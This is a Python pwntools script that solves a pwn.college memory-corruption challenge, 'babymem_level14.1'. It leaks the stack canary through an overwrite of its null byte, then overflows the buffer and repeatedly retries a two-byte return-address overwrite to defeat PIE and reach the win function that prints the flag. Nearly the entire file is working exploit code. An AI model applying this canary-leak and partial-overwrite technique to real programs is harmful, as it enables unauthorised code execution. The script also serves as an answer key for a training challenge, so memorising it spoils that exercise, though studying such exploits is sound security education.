#!usr/bin/python3
from pwn import *

# Retrieve the ELF information from the binary
elf = ELF('/challenge/babymem_level14.1')

# Set the first two bytes to use in the return address
win_address = b"\x09\x1c"

# Compute the distance from the buffer to the canary on the stack
buffer_offset = 0x128
canary_offset = 0x10
canary_distance = buffer_offset - canary_offset

# Initialize the index to reach on the stack at the first 8 bytes
# NOTE: i will always have a value multiple of 8 to read each line
#       of the memory
i = 8

while True:
    # Run the program
    io = elf.process()

    # Send the size of the first payload to the program
    # NOTE: we write the first i+1-th bytes because the stack is
    #       not cleared and it will contain the canary
    io.recvuntil(b'Payload size: ')
    io.sendline(f"{i+1}".encode())

    # Build and send the payload to the program
    # NOTE: the payload will overwrite the first byte of the canary in order
    #       to make the program print it. Also, the payload will trigger the
    #       secret method to call another time the 'challenge' method before
    #       returning in order to avoid stack smashing.
    PAYLOAD = b'REPEAT' + b'A'*(i - 5)
    io.recvuntil(b'bytes)!')
    io.sendline(PAYLOAD)

    # Retrieve the canary by reading the output and selecting the correct bytes
    # NOTE: the canary will start at index i+1 and will end at index
    #       i+8 of the string
    io.recvuntil(b'You said: ')
    canary = b'\x00' + io.recvline()[i+1:i+8]

    # Send the size of the first payload to the program
    io.recvuntil(b'Payload size: ')
    io.sendline(f"{buffer_offset + 2}".encode())

    # Build and send the payload to the program
    PAYLOAD = b'A'*canary_distance + canary + b'A'*8 + win_address
    io.recvuntil(b'bytes)!')
    io.sendline(PAYLOAD)

    # Retrieve the possible flag
    io.recvuntil(b'Goodbye!')
    canary_found = io.recvall().decode()

    # Check if the retrieved canary is the correct one. Then, we can use the index to read
    # the canary from the stack the next time we run the program
    if '*** stack smashing detected ***: terminated' not in canary_found:
        break

    # Increment the index by 8 in order to read the next stack line
    i += 8

# NOTE: because the binary uses PIE (Positional Independent Execution) we have to
#       try multiple times until the win_authed function will be loaded in our guessed
#       address.
#       This can be done because the addresses are aligned 0x1000, then the first 3 nibbles
#       are fixed and the 4th changes every execution.
while True:
    # Run the program
    io = elf.process()

    # Send the size of the first payload to the program
    # NOTE: now we know the exact position of the canary on the stack
    io.recvuntil(b'Payload size: ')
    io.sendline(f"{i+1}".encode())

    # Build and send the payload to the program
    PAYLOAD = b'REPEAT' + b'A'*(i - 5)
    io.recvuntil(b'bytes)!')
    io.sendline(PAYLOAD)

    # Retrieve the canary by reading the output and selecting the correct bytes
    io.recvuntil(b'You said: ')
    canary = b'\x00' + io.recvline()[i+1:i+8]

    # Send the size of the first payload to the program
    io.recvuntil(b'Payload size: ')
    io.sendline(f"{buffer_offset + 2}".encode())

    # Build and send the payload to the program
    PAYLOAD = b'A'*canary_distance + canary + b'A'*8 + win_address
    io.recvuntil(b'bytes)!')
    io.sendline(PAYLOAD)

    # Retrieve the possible flag
    io.recvuntil(b'Goodbye!')
    flag = io.recvall().decode()

    # Check if the flag has been retrieved correctly
    if "pwn.college" in flag:
        print(flag)
        break